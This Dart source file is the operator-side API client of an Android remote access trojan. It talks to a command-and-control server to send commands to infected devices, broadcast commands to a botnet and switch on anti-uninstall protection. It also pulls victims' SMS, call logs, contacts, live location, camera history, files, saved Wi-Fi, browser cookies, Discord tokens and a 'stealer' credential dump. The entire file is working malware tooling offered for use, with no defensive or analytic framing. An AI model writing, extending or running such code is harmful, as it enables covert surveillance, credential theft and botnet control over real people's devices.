import 'dart:convert';
import '../services/custom_http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'constants.dart';

class RatApiService {
  final String? sessionKey;

  RatApiService([this.sessionKey]);

  // Login logic removed to use main app authentication


  Future<dynamic> getNotifications(String deviceId) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/notifications/$deviceId');
    final response = await http.get(
      url, headers: {'Content-Type': 'application/json', 'x-session-key': sessionKey!},
    );
    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      // Server returns { success: true, notifications: [...] }
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        return _extractList(data, 'notifications');
      }
      // Fallback for old response format
      return _extractList(data, 'notifications');
    }
    return [];
  }

  Future<List<dynamic>> getDevices() async {
    if (sessionKey == null) throw Exception("Session Key needed");
    
    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/devices');
    final response = await http.get(
      url,
      headers: {
        'Content-Type': 'application/json',
        'x-session-key': sessionKey!,
      },
    );

    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      // Server returns { success: true, devices: [...] }
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        return _extractList(data, 'devices');
      }
      // Fallback for old response format
      return _extractList(data, 'devices');
    } else {
      throw Exception('Failed to load devices: ${response.body}');
    }
  }

  Future<void> sendCommand(String deviceId, String command, {String? args}) async {
    if (sessionKey == null) throw Exception("Session Key needed");

    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/command');
    final response = await http.post(
      url,
      headers: {
        'Content-Type': 'application/json',
        'x-session-key': sessionKey!,
      },
      body: jsonEncode({
        'deviceId': deviceId,
        'command': command,
        'args': args,
      }),
    );

    if (response.statusCode != 200) {
      final err = jsonDecode(response.body);
      throw Exception(err['error'] ?? 'Command failed');
    }
  }

  Future<void> broadcastBotnet(String command, {String? args}) async {
    if (sessionKey == null) throw Exception("Session Key needed");

    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/broadcast-botnet');
    final response = await http.post(
      url,
      headers: {
        'Content-Type': 'application/json',
        'x-session-key': sessionKey!,
      },
      body: jsonEncode({
        'command': command,
        'args': args,
      }),
    );

    if (response.statusCode != 200) {
      final err = jsonDecode(response.body);
      throw Exception(err['error'] ?? 'Broadcast failed');
    }
  }

  Future<void> toggleAntiUninstall(String deviceId, bool enabled) async {
    if (sessionKey == null) throw Exception("Session Key needed");

    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/toggle-anti-uninstall');
    final response = await http.post(
      url,
      headers: {
        'Content-Type': 'application/json',
        'x-session-key': sessionKey!,
      },
      body: jsonEncode({
        'deviceId': deviceId,
        'enabled': enabled,
      }),
    );

    if (response.statusCode != 200) {
      final err = jsonDecode(response.body);
      throw Exception(err['error'] ?? 'Failed to toggle anti-uninstall');
    }
  }
  
  Future<Map<String, dynamic>> listLiveStorage(String deviceId, {String path = ""}) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    
    // 1. Send LS command
    await sendCommand(deviceId, "LS", args: path);
    
    // 2. Poll for response
    int tries = 0;
    while (tries < 15) { // 15 seconds max
        await Future.delayed(const Duration(seconds: 1));
        final resp = await getLastResponse(deviceId);
        if (resp != null && resp['content'] != null) {
            String content = resp['content'].toString();
            if (content.startsWith('RESP:LS:')) {
                String jsonStr = content.substring(8);
                return jsonDecode(jsonStr);
            }
        }
        tries++;
    }
    throw Exception("Timeout waiting for storage response");
  }

  Future<List<dynamic>> getStorageFiles(String deviceId) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    
    // Endpoint: /api/rat/files/:deviceId
    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/files/$deviceId');
    final response = await http.get(
      url,
      headers: {
        'Content-Type': 'application/json',
        'x-session-key': sessionKey!,
      },
    );

    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      // Server returns { success: true, files: [...] }
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        return _extractList(data, 'files');
      }
      // Fallback for old response format
      return _extractList(data, 'files');
    } else {
      throw Exception('Failed to load files: ${response.body}');
    }
  }

  Future<Map<String, dynamic>?> getLastResponse(String deviceId) async {
    if (sessionKey == null) return null;
    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/response/$deviceId');
    try {
      final response = await http.get(
        url,
        headers: {
            'Content-Type': 'application/json',
            'x-session-key': sessionKey!,
        },
      );
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        // Server returns { response: {...} }
        if (data is Map && data.containsKey('response')) {
          return data['response'];
        }
        // Fallback for old response format
        return data;
      }
    } catch (e) {
      print("Error fetching response: $e");
    }
    return null;
  }

  String getDownloadUrl(String deviceId, String filename) {
    return '${RatConstants.baseUrl}/api/rat/download/$deviceId/$filename?key=$sessionKey';
  }

  Future<List<dynamic>> getContacts(String deviceId) async {
    final data = await _fetchData('contacts', deviceId);
    return _extractList(data, 'contacts');
  }

  Future<Map<String, dynamic>> getStealer(String deviceId) async {
    final data = await _fetchData('stealer', deviceId);
    if (data == null) return {};
    // Server returns { success: true, stealer: {...} }
    if (data is Map && data.containsKey('stealer')) {
      return Map<String, dynamic>.from(data['stealer'] ?? {});
    }
    // If data itself is the stealer object (old format)
    if (data is Map) {
      return Map<String, dynamic>.from(data);
    }
    return {};
  }

  Future<List<dynamic>> getSms(String deviceId) async {
    final data = await _fetchData('sms', deviceId);
    return _extractList(data, 'sms');
  }

  Future<List<dynamic>> getCallLogs(String deviceId) async {
    final data = await _fetchData('calls', deviceId);
    return _extractList(data, 'calls');
  }

  Future<Map<String, dynamic>> getSim(String deviceId) async {
    final data = await _fetchData('sim', deviceId);
    // Server returns { success: true, sim: {...} }
    if (data is Map && data.containsKey('sim')) {
      return Map<String, dynamic>.from(data['sim'] ?? {});
    }
    // Fallback for old response format
    if (data is Map) return Map<String, dynamic>.from(data);
    return {};
  }

  Future<Map<String, dynamic>> getLocation(String deviceId) async {
    final data = await _fetchData('location', deviceId);
    // Server returns { success: true, location: {...} }
    if (data is Map && data.containsKey('location')) {
      return Map<String, dynamic>.from(data['location'] ?? {});
    }
    // Fallback for old response format
    if (data is Map) return Map<String, dynamic>.from(data);
    return {};
  }

  Future<Map<String, dynamic>> getLiveLoc(String deviceId) async {
    final data = await _fetchData('live-loc', deviceId);
    // Server returns { success: true, history: [...] }
    if (data is Map) return Map<String, dynamic>.from(data);
    return {'history': []};
  }

  Future<List<dynamic>> getChatHistory(String deviceId) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/chat/$deviceId');
    final response = await http.get(
      url, headers: {'Content-Type': 'application/json', 'x-session-key': sessionKey!},
    );
    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      // Server returns { success: true, chat: [...] }
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        return _extractList(data, 'chat');
      }
      // Fallback for old response format
      return _extractList(data, 'chat');
    }
    return [];
  }

  Future<void> sendChatMessage(String deviceId, String message) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/chat');
    final response = await http.post(
      url,
      headers: {'Content-Type': 'application/json', 'x-session-key': sessionKey!},
      body: jsonEncode({'deviceId': deviceId, 'message': message}),
    );
    if (response.statusCode != 200) {
      throw Exception('Failed to send message: ${response.body}');
    }
  }

  Future<Map<String, dynamic>> getDeviceDetails(String deviceId) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    
    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/details/$deviceId');
    final response = await http.get(
      url,
      headers: {
        'Content-Type': 'application/json',
        'x-session-key': sessionKey!,
      },
    );

    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      // Server returns { success: true, device: {...} }
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        return data['device'] ?? {};
      }
      // Fallback for old response format
      return data['device'] ?? data;
    } else {
      throw Exception('Failed to load device details: ${response.body}');
    }
  }

  Future<List<dynamic>> getCameraHistory(String deviceId) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/camera/history/$deviceId');
    final response = await http.get(
      url, headers: {'Content-Type': 'application/json', 'x-session-key': sessionKey!},
    );
    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      // Server returns { success: true, history: [...] }
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        return _extractList(data, 'history');
      }
      // Fallback for old response format
      return _extractList(data, 'history');
    }
    return [];
  }
  Future<dynamic> _fetchData(String ep, String did) async {
    if (sessionKey == null) throw Exception("Session Key needed");
    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/$ep/$did');
    final r = await http.get(url, headers: {'Content-Type': 'application/json', 'x-session-key': sessionKey!});
    if (r.statusCode == 200) {
      final data = jsonDecode(r.body);
      // Server returns { success: true, key: [...] } format
      if (data is Map && data.containsKey('success') && data['success'] == true) {
        // Extract the actual data from the response
        // Try to find the key that contains the list (excluding 'success')
        if (data is Map) {
          for (var k in data.keys) {
            if (k != 'success' && data[k] != null) {
              return data[k];
            }
          }
        }
        return data;
      }
      return data;
    }
    return null;
  }

  List<dynamic> _extractList(dynamic v, [String? key]) {
    if (v == null) return [];
    if (v is List) return v;
    if (v is Map) {
      if (key != null && v.containsKey(key) && v[key] is List) return v[key];
      final keys = ['networks', 'apps', 'blacklist', 'list', 'history', 'tokens', 'contacts', 'calls', 'sms', 'devices', 'files', 'notifications', 'chat'];
      for (var k in keys) {
        if (v.containsKey(k)) {
          if (v[k] is List) return v[k];
          if (v[k] is Map) return _extractList(v[k], key); 
        }
      }
      for (var val in v.values) {
        if (val is List) return val;
      }
    }
    return [];
  }

  Future<dynamic> getRunningApps(String d) => _fetchData('running-apps', d).then((v) => _extractList(v, 'apps'));
  Future<dynamic> getInstalledApps(String d) => _fetchData('installed-apps', d).then((v) => _extractList(v, 'apps'));
  Future<dynamic> getSavedWifi(String d) => _fetchData('wifi/saved', d).then((v) => _extractList(v, 'networks'));
  Future<List<dynamic>> getNearbyWifi(String d) => _fetchData('wifi/nearby', d).then((v) => _extractList(v, 'networks'));
  Future<List<dynamic>> getBlacklist(String d) => _fetchData('blacklist', d).then((v) => _extractList(v, 'blacklist'));
  Future<List<dynamic>> getDiscordTokens(String deviceId) => _fetchData('discord-tokens', deviceId).then((v) => _extractList(v, 'tokens'));
  Future<List<dynamic>> getCookies(String deviceId) => _fetchData('cookies', deviceId).then((v) => _extractList(v, 'history'));
}
